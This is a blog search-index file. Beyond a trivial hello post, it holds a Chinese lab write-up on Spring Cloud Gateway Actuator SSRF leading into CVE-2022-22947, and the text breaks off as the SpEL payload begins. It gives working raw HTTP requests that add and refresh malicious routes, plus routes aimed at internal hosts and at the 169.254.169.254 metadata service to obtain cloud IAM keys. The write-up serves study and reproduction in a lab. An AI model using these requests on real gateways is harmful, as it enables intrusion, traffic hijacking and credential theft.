[{"content":"一张外链图：\n代码块（bash）：\nbash\r1 echo hello python\r1 print(\u0026#34;hello\u0026#34;) ","permalink":"http://localhost:1313/xvsf/posts/hello/","summary":"\u003cp\u003e一张外链图：\u003c/p\u003e\n\u003cp\u003e\u003cimg decoding=\"async\" loading=\"lazy\" src=\"https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081506159.jpeg\" style=\"max-width: 100%; height: auto;\"\u003e\u003c/p\u003e\n\u003cp\u003e代码块（bash）：\u003c/p\u003e\n\u003cdiv class=\"code-block-container\" data-expanded=\"true\"\u003e\r\n    \u003cdiv class=\"code-header\"\u003e\r\n        \u003cdiv class=\"mac-buttons\"\u003e\r\n            \u003cspan class=\"mac-button red\"\u003e\u003c/span\u003e\r\n            \u003cspan class=\"mac-button yellow\"\u003e\u003c/span\u003e\r\n            \u003cspan class=\"mac-button green\"\u003e\u003c/span\u003e\r\n        \u003c/div\u003e\r\n        \u003cspan class=\"code-language\"\u003ebash\u003c/span\u003e\r\n        \u003cdiv class=\"code-actions\"\u003e\r\n            \u003cbutton class=\"copy-btn\" title=\"Copy\"\u003e\r\n                \u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"\u003e\u003crect x=\"9\" y=\"9\" width=\"13\" height=\"13\" rx=\"2\" ry=\"2\"\u003e\u003c/rect\u003e\u003cpath d=\"M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1\"\u003e\u003c/path\u003e\u003c/svg\u003e\r\n            \u003c/button\u003e\r\n            \u003cbutton class=\"toggle-btn\" title=\"Toggle\"\u003e\r\n                \u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"feather feather-chevron-down\"\u003e\u003cpolyline points=\"6 9 12 15 18 9\"\u003e\u003c/polyline\u003e\u003c/svg\u003e\r\n            \u003c/button\u003e\r\n        \u003c/div\u003e\r\n    \u003c/div\u003e\r\n    \u003cdiv class=\"code-content\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cdiv class=\"chroma\"\u003e\n\u003ctable class=\"lntable\"\u003e\u003ctr\u003e\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode\u003e\u003cspan class=\"lnt\" id=\"1\"\u003e\u003ca class=\"lnlinks\" href=\"#1\"\u003e1\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e hello\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003c/div\u003e\r\n\u003c/div\u003e\u003cdiv class=\"code-block-container\" data-expanded=\"true\"\u003e\r\n    \u003cdiv class=\"code-header\"\u003e\r\n        \u003cdiv class=\"mac-buttons\"\u003e\r\n            \u003cspan class=\"mac-button red\"\u003e\u003c/span\u003e\r\n            \u003cspan class=\"mac-button yellow\"\u003e\u003c/span\u003e\r\n            \u003cspan class=\"mac-button green\"\u003e\u003c/span\u003e\r\n        \u003c/div\u003e\r\n        \u003cspan class=\"code-language\"\u003epython\u003c/span\u003e\r\n        \u003cdiv class=\"code-actions\"\u003e\r\n            \u003cbutton class=\"copy-btn\" title=\"Copy\"\u003e\r\n                \u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"\u003e\u003crect x=\"9\" y=\"9\" width=\"13\" height=\"13\" rx=\"2\" ry=\"2\"\u003e\u003c/rect\u003e\u003cpath d=\"M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1\"\u003e\u003c/path\u003e\u003c/svg\u003e\r\n            \u003c/button\u003e\r\n            \u003cbutton class=\"toggle-btn\" title=\"Toggle\"\u003e\r\n                \u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"feather feather-chevron-down\"\u003e\u003cpolyline points=\"6 9 12 15 18 9\"\u003e\u003c/polyline\u003e\u003c/svg\u003e\r\n            \u003c/button\u003e\r\n        \u003c/div\u003e\r\n    \u003c/div\u003e\r\n    \u003cdiv class=\"code-content\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cdiv class=\"chroma\"\u003e\n\u003ctable class=\"lntable\"\u003e\u003ctr\u003e\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode\u003e\u003cspan class=\"lnt\" id=\"1\"\u003e\u003ca class=\"lnlinks\" href=\"#1\"\u003e1\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;hello\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003c/div\u003e\r\n\u003c/div\u003e","title":"Hello"},{"content":"CVE-2022-22947 的起因是作者 @Wyatt 在 Bring Your Own SSRF – The Gateway Actuator 一文中提及到利用 Spring Cloud Gateway Actuator 构造 SSRF，之后该作者利用发现的暴露的 Actuator 执行器，在 CVE-2022-22947: SpEL Casting and Evil Beans 中讲到： /actuator/gateway/routes/创建路由并在 filters字段插入一个 SpEL 表达式，Spring Cloud Gateway 在处理过滤器时会执行该表达式，通过构造恶意 SpEL 可实现 RCE。\n先来学习一下这篇文章：Bring Your Own SSRF – The Gateway Actuator\n一、利用 Spring Cloud Gateway Actuator 创建一个自己的 SSRF 入口。 1.1 Spring Cloud Gateway 介绍 参考：https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/#gateway-starter\n1.1.1 简介 Spring Cloud Gateway 是 Spring 提供的 API 网关，用来为微服务架构提供一种简单、有效、统一的 API 路由管理方式:\n统一入口（所有请求先经过网关） 路由转发（把请求转发到不同微服务） 过滤器链（鉴权、限流、日志、修改请求/响应等） 负载均衡（结合 Spring Cloud LoadBalancer） 统一监控（Actuator、指标、健康检查等） 1.1.2 三个核心 Route 路由 网关的基本组成部分，由一个标识符、一个目标 URL、一组谓词以及一组过滤器来定义\nPredicate 断言 Predicate: This is a Java 8 Function Predicate. The input type is a Spring FrameworkServerWebExchange. This lets you match on anything from the HTTP request, such as headers or parameters.\n谓词说明：这是一个 Java 8 函数谓词。其输入类型为 Spring 框架的 ServerWebExchange。它允许您根据 HTTP 请求中的任何内容进行匹配，例如头信息或参数。\n简单来说就是判断是否命中路由。\nFilter 过滤器 Filter: These are instances of GatewayFilter that have been constructed with a specific factory. Here, you can modify requests and responses before or after sending the downstream request.\n过滤器：这些是通过特定工厂构建的 GatewayFilter 实例。在此，您可以在发送下游请求之前或之后对请求和响应进行修改。\n过滤器在转发前后的做处理\n1.2.3 调用链 首先找到入口：\n源码位置：\ntext\r1 *org\\springframework\\spring-web\\5.3.23\\spring-web-5.3.23-sources.jar!\\org\\springframework\\web\\server\\WebHandler.java* WebFlux 接收 HTTP 请求的入口，相当于 Servlet 世界里的 Servlet.service() 方法。\n当浏览器访问 http://localhost:9000/user/info（结合下方的 DEMO） 时，Netty 或 Tomcat（WebFlux 默认是 Netty）把请求交给 WebHandler 处理 。\nhandle将请求封装为 ServerWebExchange，之后执行 filter 的一系列。\n源码位置：\ntext\r1 *org\\springframework\\cloud\\spring-cloud-gateway-server\\3.1.1-SNAPSHOT\\spring-cloud-gateway-server-3.1.1-SNAPSHOT.jar!\\org\\springframework\\cloud\\gateway\\handler\\RoutePredicateHandlerMapping.class* ServerWebExchange从WebHandler传到RoutePredicateHandlerMapping，根据请求 URL 匹配对应的路由，之后返回一个HandlerExecutionChain 源码位置：\ntext\r1 *org.springframework.cloud.gateway.filter.GatewayFilterChain* GatewayFilterChain 管理所有 GatewayFilter 的执行顺序，每个 Filter 通过链式调用处理请求\n源码位置：\ntext\r1 *org\\springframework\\cloud\\spring-cloud-gateway-server\\3.1.1-SNAPSHOT\\spring-cloud-gateway-server-3.1.1-SNAPSHOT.jar!\\org\\springframework\\cloud\\gateway\\filter\\factory\\AddRequestHeaderGatewayFilterFactory.class* 在请求被转发到下游服务之前，会给ServerHttpRequest添加一个 HTTPHeader，在本 DEMO 中，它是：AddRequestHeader=token, abc123\n源码位置：\ntext\r1 *org\\springframework\\cloud\\spring-cloud-gateway-server\\3.1.1-SNAPSHOT\\spring-cloud-gateway-server-3.1.1-SNAPSHOT.jar!\\org\\springframework\\cloud\\gateway\\filter\\NettyRoutingFilter.class* NettyRoutingFilter 使用 Reactor Netty 的 HttpClient 将请求异步转发到下游服务（如 user-service），在此过程中，不仅会完成实际的 HTTP 请求调用，还会拷贝原始请求中的所有请求头信息（包括认证 token）以确保上下文的一致性。当从下游服务接收到响应后，该响应会被封装成 ServerWebExchange 对象的形式返回给客户端，这样就实现了从接收请求、转发处理到最终响应的全链路流程。\nGateway 的 NettyRoutingFilter 通过 HttpClient 将请求真正发到：http://localhost:8081/user/info；User-Service 开始解析处理：\n在 Spring MVC 的核心控制器，接收 Gateway 转发的 HTTP 请求并分发给对应的 Controller。\njava\r1 doDispatch(request, response); 在HandlerMapping中根据请求路径/user/info找到对应的Controller方法，去调用HandlerMapping.getHandler(request)方法，找到UserController.getUser()方法进行下一步处理。\nUserController.getUser()方法呢，会读取 HTTPHeader 中的 token，通过注解@RequestHeadler将请求头注入到方法参数中\nDispatcherServlet 底层调用 HttpServletRequest.getHeader(\u0026quot;token\u0026quot;)，获取请求中的 token header，再封装成 HTTP 响应，返回给 Gateway， 通过 Gateway 访问， UserController返回： token = abc123\nDEMO 总的一个思路：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Gateway: WebHandler //（WebFlux 接收 HTTP 请求的入口。 -\u0026gt; handle //调用方法 -\u0026gt; handle.RoutePredicateHandlerMapping // 匹配路由 /user/**；匹配成功后，返回一个 HandlerExecutionChain -\u0026gt; GatewayFilterChain -\u0026gt; AddRequestHeaderGatewayFilterFactory 添加 token header -\u0026gt; NettyRoutingFilter 转发请求 -\u0026gt; HttpClient 调用 user-service user-service: DispathcherServlet -\u0026gt; HandlerMapping -\u0026gt; UserController.getUser() -\u0026gt; request.getHeader(\u0026#34;token\u0026#34;) -\u0026gt; return \u0026#34;UserService 返回：token = abc123\u0026#34; spring-gateway-demo pom.xml\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!-- Spring Cloud Gateway --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-gateway\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- Actuator（可看路由、调试） --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-actuator\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; application.yml\nyaml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # 应用服务 WEB 访问端口 server: port: 9000 spring: cloud: gateway: #配置路由表（可以有多个路由） routes: - id: user-service #指定该路由的目标服务器地址，路径匹配时，Gateway会将请求转发到 user-service uri: http://localhost:8081 #路由断言，判断什么请求能匹配到这一条路由，这里的意思是：只要路径以 /user/ 开头，都由 Gateway 转发到 8081 predicates: - Path=/user/** #配置过滤器，功能：在转发前自动为请求添加一个 Header filters: - AddRequestHeader=token, abc123 GatewayApplication.java\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 package com.src.springgatewaydemo; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; @SpringBootApplication public class GatewayApplication { public static void main(String[] args) { SpringApplication.run(GatewayApplication.class, args); } } user-service UserController.java\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package com.src.userservice.controller; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RequestHeader; import org.springframework.web.bind.annotation.RestController; @RestController public class UserController { //使用 @RequestHeader 从 HTTP 请求头中读取 token，如果请求来自 Gateway 则添加 header -\u0026gt; token = abc123 @GetMapping(\u0026#34;/user/info\u0026#34;) public String getUser(@RequestHeader(value = \u0026#34;token\u0026#34;, required = false) String token) { return \u0026#34;UserService 返回：token = \u0026#34; + token; } } application.yml\nyaml\r1 2 server: port: 8081 UserServiceApplication.java\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 package com.src.userservice; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; @SpringBootApplication public class UserServiceApplication { public static void main(String[] args) { SpringApplication.run(UserServiceApplication.class, args); } } pom.xml\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-test\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 先运行 UserService，再运行 Gateway，通过访问 http://127.0.0.1:9000/user/info 返回 token：\n这样就达到了我们的预期结果：\n访问 Gateway (**9000**) Gateway 会自动加上 token=abc123 转发给 user-service user-service 收到 header → 输出 token = abc123 直接访问 user-service (**8081**) 请求中没有 header user-service 读到 null → 输出 token = null 1.2 /actuator/gateway 本文借用 Bring Your Own SSRF – The Gateway Actuator 一文中的项目https://github.com/wdahlenburg/spring-gateway-demo?tab=readme-ov-file 进行学习\n当我们访问 /actuator/gateway 时出现 404 错误，而正常情况，大多数执行器在收到 GET 请求后都会显示其默认内容。\n查看文档： https://cloud.spring.io/spring-cloud-gateway/reference/html/#recap-the-list-of-all-endpoints\n根据官方文档，Spring Cloud Gateway 是没有 /actuator/gateway 这个端点的，都是以/actuator/gateway/*** 开头的子路径\n接着访问/actuator/gateway/routes\n分析返回内容：\nJSON 中包含俩个路由配置：\nroute_id = test\nroute_id = get\nhtml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 [ { \u0026lt;!--断言：/test/**;\u0026#39;match trailing slash: true\u0026#39; 表示 /test/abc/也会匹配 /test/abc也匹配--\u0026gt; \u0026#34;predicate\u0026#34;: \u0026#34;Paths: [/test/**], match trailing slash: true\u0026#34;, \u0026#34;route_id\u0026#34;: \u0026#34;test\u0026#34;, \u0026lt;!--显示了 Gateway 自动解析后的过滤器，RewritePath 过滤器 --\u0026gt; \u0026lt;!--路径重写规则：匹配以 /test 开头的路径，用正则捕获 /test 后面的所有内容为 path，最终路径变成：/test/aaa/bbb 改为 /aaa/bbb --\u0026gt; \u0026#34;filters\u0026#34;: [\u0026#34;[[RewritePath /test(?\u0026lt;path\u0026gt;.*) = \u0026#39;/${path}\u0026#39;], order = 0]\u0026#34;], \u0026lt;!--请求会被代理到 Google，强制使用 https（443） --\u0026gt; \u0026#34;uri\u0026#34;: \u0026#34;https://www.google.com:443\u0026#34;, \u0026lt;!--路由匹配顺序，默认都是 0 --\u0026gt; \u0026#34;order\u0026#34;: 0 }, { \u0026lt;!--断言：/get/** --\u0026gt; \u0026#34;predicate\u0026#34;: \u0026#34;Paths: [/get/**], match trailing slash: true\u0026#34;, \u0026#34;route_id\u0026#34;: \u0026#34;get\u0026#34;, \u0026lt;!--AddRequestHeader 过滤器，所有转发到 httpbin.org 的请求，都会自动加一个请求头：X-Gateway-Test: Foo --\u0026gt; \u0026#34;filters\u0026#34;: [\u0026#34;[[AddRequestHeader X-Gateway-Test = \u0026#39;Foo\u0026#39;], order = 0]\u0026#34;], \u0026#34;uri\u0026#34;: \u0026#34;https://httpbin.org:443\u0026#34;, \u0026#34;order\u0026#34;: 0 } ] 根据上面的分析，我们知道当请求/get/**时，Gateway 会把请求发送到http://httpbin.org/get；\n而我们通过 Actuator 查看路由，可以发现隐藏的、可能暴露内部系统的代理的路由，这可能存在安全风险。而 CVE-2022-22947 正是 Gateway 被利用 —— 可以发送 SSRF 请求。\n1.3 添加路由 1.3.1 Actuators are primarily intended to provide administrative functionality, so of course the gateway actuator allows you to add and delete routes. As a note, all sensitive actuators should be behind administrative authentication or disabled.\nActuator 本来就提供管理功能，可以查看、修改、刷新系统状态，Spring Cloud Gateway 的 actuator 可以添加和删除路由。如果没有对此项功能进行保护，就会产生漏洞\nAs an attacker what would it look like if you could add a route to a running application? Well you could route to internal applications. You could route to cloud metadata services and try to obtain credentials. You could re-route active paths on the app to a server you control to obtain cookies, tokens, etc. All of these are possible with the gateway actuator.\n如果一个攻击者可以自由添加路由，那么他能做什么？\n路由到内部服务（内网） 添加以下路由：\nplain\r1 2 3 4 5 6 7 8 9 POST /actuator/gateway/routes/evil { \u0026#34;id\u0026#34;: \u0026#34;evil\u0026#34;, \u0026#34;uri\u0026#34;: \u0026#34;http://10.0.0.5:8080\u0026#34;, \u0026#34;predicates\u0026#34;: [{ \u0026#34;name\u0026#34;: \u0026#34;Path\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;pattern\u0026#34;: \u0026#34;/attack/**\u0026#34; } }] } 访问 /attack/** 就能访问本来不能访问的内网：http://10.0.0.1:8080/admin，SSRF 升级为内网穿透。\n访问云环境的 Metadata Service ，窃取云凭证 Metadata Service 元数据服务， 是一个本地伪装的 HTTP 服务，它不在网络里，但是只能被虚机本身访问。例如：169.254.169.254， 这是全球云通用的 Metadata 地址。\n元数据服务作用：\n提供当前机器是什么实例类型、所在区域、主机名、公网私网 IP 以及分配给该云主机的 IAM 权限临时密钥 在云环境中，服务器本身总是能访问 metadata，通过 SSRF 就可以放服务器访问http://169.254.169.254/latest/meta-data/iam/security-credentials ，这是一个严重漏洞\n攻击者添加路由：\nplain\r1 uri: http://169.254.169.254/latest/meta-data/ 然后访问：\nplain\r1 /aws-keys/iam/security-credentials 即可获取 AWS（云厂商） IAM 临时密钥 —— 相当于瞬间拿下服务器权限。\n这是云环境最致命的风险之一。\n劫持路由，把用户流量转向攻击者服务器 比如修改 /login-\u0026gt;攻击者服务器，就可以劫持用户信息等。\n这相当于攻击者控制了整个后端系统的访问流量。\n*当然以上推测的前提是 Actutor Gateway 路由端点对外可访问且没有启用安全保护措施。*\nFrom reviewing the spring-cloud-gateway-server-2.2.10.RELEASE.jar I was able to see that valid routes can be resolved with the http/https, ws/wss, lb, and forward URI schemes. The first two, http/https, enable http requests to be routed. The ws/wss schemes allow for a websocket route to be created. The lb scheme stands for load balancer, which usually are going to be predefined hosts that can be addressed in a route. Finally the forward scheme appears to be used as way of performing a redirect without forcing the client to handle the 301/302 redirect. All other schemes don’t currently resolve unless an extension is added to support additional schemes.\n作者通过查看 spring-cloud-gateway-server-2.2.10.RELEASE.jar 文件，了解到有效的路由可以通过 http/https、ws/wss、lb 和 forward URI 方案进行解析\n1.3.2 添加 Spring Cloud Gateway route 的 Raw HTTP 请求 plain\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # /actuator/gateway/routes/{id}：这里 {id} = new_route ，创建一个名为 new_route 的路由 POST /actuator/gateway/routes/new_route HTTP/1.1 Host: localhost:9000 Connection: close Content-Type: application/json #路由的主体 { \u0026#34;predicates\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Path\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;_genkey_0\u0026#34;: \u0026#34;/new_route/**\u0026#34; } } ], # 将 /new_route/... 重写为 /... ，经典的 URL 清洗方式 \u0026#34;filters\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;RewritePath\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;_genkey_0\u0026#34;: \u0026#34;/new_route(?\u0026lt;path\u0026gt;.*)\u0026#34;, \u0026#34;_genkey_1\u0026#34;: \u0026#34;/${path}\u0026#34; } } ], #目标站点（这里是 Wyatt 师傅的站点） \u0026#34;uri\u0026#34;: \u0026#34;https://wya.pl\u0026#34;, \u0026#34;order\u0026#34;: 0 } 状态码 201， 已经成功创建了新的路由：\n访问新路由：这时候因为还没有刷新，所以返回 404\nplain\r1 2 3 GET /new_route HTTP/1.1 Host: localhost:9000 Connection: close 传入：发送刷新请求，让服务采用新路由\nplain\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 POST /actuator/gateway/refresh HTTP/1.1 Host: localhost:9000 Content-Type: application/json Connection: close Content-Length: 230 { \u0026#34;predicate\u0026#34;: \u0026#34;Paths: [/new_route], match trailing slash: true\u0026#34;, \u0026#34;route_id\u0026#34;: \u0026#34;new_route\u0026#34;, \u0026#34;filters\u0026#34;: [ \u0026#34;[[RewritePath /new_route(?\u0026lt;path\u0026gt;.*) = /${path}], order = 1]\u0026#34; ], \u0026#34;uri\u0026#34;: \u0026#34;https://wya.pl\u0026#34;, \u0026#34;order\u0026#34;: 0 } 查看路由确认 new_routes 已被添加：\nplain\r1 2 3 GET /actuator/gateway/routes HTTP/1.1 Host: localhost:9000 Connection: close 小插曲，可以跳过 我这里出现一个小错误：\n访问路由时返回 500 错误，Gateway 无法与 https://wya.pl 建立连接\n报错日志：\nJDK 1.8.0_65 不信任 wya.pl 网站的 SSL 证书。\nplain\r1 2 3 GET /new_route/ HTTP/1.1 Host: localhost:9000 Connection: close 试着换成 JDK 11\n又爆了 502 .。。\nCloudflare/WP/某些 nginx 配置可能会拒绝没有 UA 的请求。\n添加 UA 头：\nplain\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 POST /actuator/gateway/routes/new_route HTTP/1.1 Host: localhost:9000 Connection: close Content-Type: application/json { \u0026#34;predicates\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Path\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;_genkey_0\u0026#34;: \u0026#34;/new_route/**\u0026#34; } } ], \u0026#34;filters\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;RewritePath\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;_genkey_0\u0026#34;: \u0026#34;/new_route(?\u0026lt;path\u0026gt;.*)\u0026#34;, \u0026#34;_genkey_1\u0026#34;: \u0026#34;/${path}\u0026#34; } }, { \u0026#34;name\u0026#34;: \u0026#34;AddRequestHeader\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;_genkey_0\u0026#34;: \u0026#34;User-Agent\u0026#34;, \u0026#34;_genkey_1\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64)\u0026#34; } } ], \u0026#34;uri\u0026#34;: \u0026#34;https://wya.pl\u0026#34;, \u0026#34;order\u0026#34;: 0 } 还是不行。\n最后我把网址换成自己的，可以访问到。\n完整的添加路由过程： 创建路由 plain\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 POST /actuator/gateway/routes/new_route HTTP/1.1 Host: localhost:9000 Connection: close Content-Type: application/json { \u0026#34;predicates\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Path\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;_genkey_0\u0026#34;: \u0026#34;/new_route/**\u0026#34; } } ], \u0026#34;filters\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;RewritePath\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;_genkey_0\u0026#34;: \u0026#34;/new_route(?\u0026lt;path\u0026gt;.*)\u0026#34;, \u0026#34;_genkey_1\u0026#34;: \u0026#34;/${path}\u0026#34; } } ], \u0026#34;uri\u0026#34;: \u0026#34;https://xvshifu.github.io/\u0026#34;, \u0026#34;order\u0026#34;: 0 } 刷新路由 plain\r1 2 3 4 5 POST /actuator/gateway/refresh HTTP/1.1 Host: localhost:9000 Content-Type: application/json Connection: close Content-Length: 0 查看添加的路由 plain\r1 2 3 GET /actuator/gateway/routes HTTP/1.1 Host: localhost:9000 Connection: close 访问路由 plain\r1 2 3 GET /new_route/ HTTP/1.1 Host: localhost:9000 Connection: close 清理 完成测试后，为了确保应用程序不会处于不安全的状态，进行清理工作是很有必要的：\nplain\r1 2 3 DELETE /actuator/gateway/routes/new_route HTTP/1.1 Host: localhost:9000 Connection: close 同样的，执行刷新之后才会生效。\nplain\r1 2 3 4 5 POST /actuator/gateway/refresh HTTP/1.1 Host: localhost:9000 Content-Type: application/json Connection: close Content-Length: 0 可以看到刚才创建的路径已经不存在了\n这就是成功得将一条新的路由添加到了程序中，通过使用这个端点我们可以将流量代理到它能够访问的任何服务器上（当然，正如上文中我所遇到的问题， Cloudflare 或者其他的服务器也会对这些流量进行防护、拦截、过滤等），\n1.4 总结 Conclusion The gateway router actuator is pretty powerful. It can allow for users to discover predefined routes along with the ability to add or delete routes. This could lead to cloud metadata keys being taken, internal applications being exposed, or denial of service attacks. Note that any changes made through this actuator are only in memory. Restarting the application will restore the original routes defined by the application.\nThe documentation from Spring goes a lot more in depth about how it works and some other ways to configure the routes. I encourage you to check out the details here: https://cloud.spring.io/spring-cloud-gateway/reference/html/\nI haven’t seen anyone put together the proper requests as most of Spring’s examples are in code. I managed to scrape together enough details by searching Github and looking at the source code in the library. It was really exciting to get this working in a lab and then test it out on a bug bounty target.\nThis actuator hasn’t been in wordlists or scanners, so I’ve gone ahead and submitted PRs to Dirsearch, Seclists, and Nuclei.\nIf you’ve had success with this in an engagement or bug bounty I’d love to hear about it. Share what you are able to on Twitter.\nUpdate 1/2/22: I have created a sample application to allow others to test out the gateway actuator here: https://github.com/wdahlenburg/spring-gateway-demo\n结论 网关路由器执行器功能强大。它能让用户发现预设的路由，并且具备添加或删除路由的能力。这可能会导致云元数据密钥被获取、内部应用程序被暴露，或者引发拒绝服务攻击。请注意，通过此执行器所做的任何更改都只在内存中。重新启动应用程序将恢复由应用程序定义的原始路由。\nSpring 的相关文档对它的工作原理以及一些其他配置路由的方法进行了更深入的阐述。我鼓励您在此处查看详细内容：https://cloud.spring.io/spring-cloud-gateway/reference/html/\n我还没见过有人能正确地提出相关请求，因为 Spring 的大多数示例都是以代码形式呈现的。我通过在 Github 上搜索以及查看库中的源代码，总算整理出了足够的细节。在实验室中成功实现这一功能，并随后在漏洞赏金目标上进行测试，这真的让我感到非常兴奋。\n这个驱动器尚未出现在词典或扫描器中，所以我已经向 Dirsearch、Seclists 和 Nuclei 提交了 pull 请求。\n如果您在参与活动或漏洞赏金项目中取得了成功，我很乐意听您分享相关情况。请在推特上分享您所掌握的详细信息。\n更新于 2022 年 1 月 2 日：我已创建了一个示例应用程序，以便其他人能够在此测试网关执行器：https://github.com/wdahlenburg/spring-gateway-demo\n总得来说 Spring Cloud Gateway 的 Actuator 功能过强，如果不加以保护，用户就可以直接通过 HTTP POST 添加、修改路由。\n二、CVE-2022-22947：SpEL 类型转换与恶意 Beans 作者 Wyatt 在研究 Spring Cloud Gateway Server 的源码时，发现系统内部使用了 SpEL，\nSpEL 本身不是漏洞，但有一个基本安全原则：外部输入（用户可控的数据）绝不能直接进入 SpEL 表达式解析器，因为\nSpEL 能执行方法调用 SpEL 能访问 Spring Bean SpEL 甚至可以用来执行任意 Java 代码 那么在配置路由中，就可以给某个参数注入恶意的 JSON：\nplain\r1 2 3 4 5 6 7 8 9 10 11 12 { \u0026#34;id\u0026#34;: \u0026#34;evil\u0026#34;, \u0026#34;filters\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;RewritePath\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;regexp\u0026#34;: \u0026#34;.*\u0026#34;, \u0026#34;replacement\u0026#34;: 